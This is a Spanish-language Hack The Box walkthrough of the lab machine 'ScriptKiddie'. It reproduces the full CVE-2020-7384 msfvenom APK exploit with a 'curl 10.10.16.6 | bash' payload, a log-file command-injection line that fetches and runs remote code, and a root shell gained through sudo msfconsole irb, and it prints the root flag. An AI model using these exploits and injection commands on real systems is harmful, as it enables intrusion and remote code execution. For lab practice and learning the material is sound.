---
layout: single
title: ScriptKiddie - Hack The Box
excerpt: "ScriptKiddie is an easy difficulty Linux machine that presents a Metasploit vulnerability ([CVE-2020-7384](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-7384)), along with classic attacks such as OS command injection and an insecure passwordless `sudo` configuration. Initial foothold on the machine is gained by uploading a malicious `.apk` file from a web interface that calls a vulnerable version of `msfvenom` to generate downloadable payloads. Once shell is obtained, lateral movement to a second user is performed by injecting commands into a log file which provides unsanitized input to a Bash script that is triggered on file modification. This user is allowed to run `msfconsole` as `root` via `sudo` without supplying a password, resulting in the escalation of privileges."
date: 2024-04-18
classes: wide
header:
  teaser: /assets/images/htb-script/script.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags: 
  - Msfvenom
  - Script
  - Pivoting
---

![](/assets/images/htb-script/script.png)

ScriptKiddie is an easy difficulty Linux machine that presents a Metasploit vulnerability ([CVE-2020-7384](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-7384)), along with classic attacks such as OS command injection and an insecure passwordless `sudo` configuration. Initial foothold on the machine is gained by uploading a malicious `.apk` file from a web interface that calls a vulnerable version of `msfvenom` to generate downloadable payloads. Once shell is obtained, lateral movement to a second user is performed by injecting commands into a log file which provides unsanitized input to a Bash script that is triggered on file modification. This user is allowed to run `msfconsole` as `root` via `sudo` without supplying a password, resulting in the escalation of privileges. 

## Portscan

```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n 10.10.10.226 -oG allports                                     
[sudo] contraseña para kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-18 11:48 CEST
Initiating Ping Scan at 11:48
Scanning 10.10.10.226 [4 ports]
Completed Ping Scan at 11:48, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:48
Scanning 10.10.10.226 [65535 ports]
Discovered open port 22/tcp on 10.10.10.226
Discovered open port 5000/tcp on 10.10.10.226
Completed SYN Stealth Scan at 11:48, 13.04s elapsed (65535 total ports)
Nmap scan report for 10.10.10.226
Host is up, received echo-reply ttl 63 (0.12s latency).
Scanned at 2024-04-18 11:48:21 CEST for 13s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.38 seconds
           Raw packets sent: 68669 (3.021MB) | Rcvd: 67851 (2.714MB)

```
Y con esto analizamos los puertos abiertos:
```
nmap -sCV -p22,5000 -Pn 10.10.10.226 -oN targeted                                                                                                                                                                 130 ⨯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-18 11:54 CEST
Nmap scan report for 10.10.10.226
Host is up (0.053s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.21 seconds

```
## Analisis Web

Vemos que nos lleva a una pagina:
![](/assets/images/htb-script/pag1.png)

Vemos que la segunda introduccion de datos juega con msfvenom,  asi que vamos a buscar con searchsploit y encontramos un exploit. Nos lo llevamos a nuestro equipo y vammos a ver que hace:
```
# Exploit Title: Metasploit Framework 6.0.11 - msfvenom APK template command injection
# Exploit Author: Justin Steven
# Vendor Homepage: https://www.metasploit.com/
# Software Link: https://www.metasploit.com/
# Version: Metasploit Framework 6.0.11 and Metasploit Pro 4.18.0
# CVE : CVE-2020-7384

#!/usr/bin/env python3
import subprocess
import tempfile
import os
from base64 import b64encode

# Change me
payload = 'curl 10.10.16.6 | bash'

# b64encode to avoid badchars (keytool is picky)
payload_b64 = b64encode(payload.encode()).decode()
dname = f"CN='|echo {payload_b64} | base64 -d | bash #"

print(f"[+] Manufacturing evil apkfile")
print(f"Payload: {payload}")
print(f"-dname: {dname}")
print()

tmpdir = tempfile.mkdtemp()
apk_file = os.path.join(tmpdir, "evil.apk")
empty_file = os.path.join(tmpdir, "empty")
keystore_file = os.path.join(tmpdir, "signing.keystore")
storepass = keypass = "password"
key_alias = "signing.key"

# Touch empty_file
open(empty_file, "w").close()

# Create apk_file
subprocess.check_call(["zip", "-j", apk_file, empty_file])

# Generate signing key with malicious -dname
subprocess.check_call(["keytool", "-genkey", "-keystore", keystore_file, "-alias", key_alias, "-storepass", storepass,
                       "-keypass", keypass, "-keyalg", "RSA", "-keysize", "2048", "-dname", dname])

# Sign APK using our malicious dname
subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore_file,
                       "-storepass", storepass, "-keypass", keypass, apk_file, key_alias])

print()
print(f"[+] Done! apkfile is at {apk_file}")
print(f"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null")

```
Hemos sustituido el comando para ejecutarnos una bash en nuestra ip, ahora le damos privilegios para poder meterlo en la página(sudo chown kali:kali -R /tmp/tmptgdoeu2s/)
Nos montamos un servidor en python y en escucha por la 443 y enviamos el exploit.

## Escalada de privilegios

Ahora ya hemos accedido al sistema.
Podemos encontrar la flag de usuario.
Vemos que hay un script hackers que no podemos leer pero si usar, y en el directorio logs encontramos el script de la app. La cual tambien usa scanloosers.sh en el directorio de otro usuario llamado pwn.
```
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
```
Aqui vemos que coje del script de hackers a partir del tercer input, lo que nos puede llevar a una posible inyeccion

```
echo "a b 10.10.16.6; curl 10.10.16.6 | bash #" > hackers
```
Si introducimos esto mientras seguimos en escucha en otra terminal por el puerto 443 y con un servidor en python3
Ahora hemos accedido al usuario pwn, vamos a ver que privilegios tiene este usuario:

```
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole

```
Podemos ejecutar el metasploit con root,  y dentro de metasploit podemos usar una consola en la que ejecutar comandos y como lo hemos iniciado con root podremos usar comandos de root, y por tanto encontrar la flag de root:

```
msf6 > irb
stty: 'standard input': Inappropriate ioctl for device
[*] Starting IRB shell...
[*] You are in the "framework" object

system("whoami")
Switch to inspect mode.
irb: warn: can't alias jobs from irb_jobs.
>> system("whoami")
root
system("bash")
=> true
>> system("bash")
whoami
root
cd /root
ls
root.txt
snap
cat root.txt
34e315f940c71771856d6c7d95c36340

```
Y ya lo tendriamos
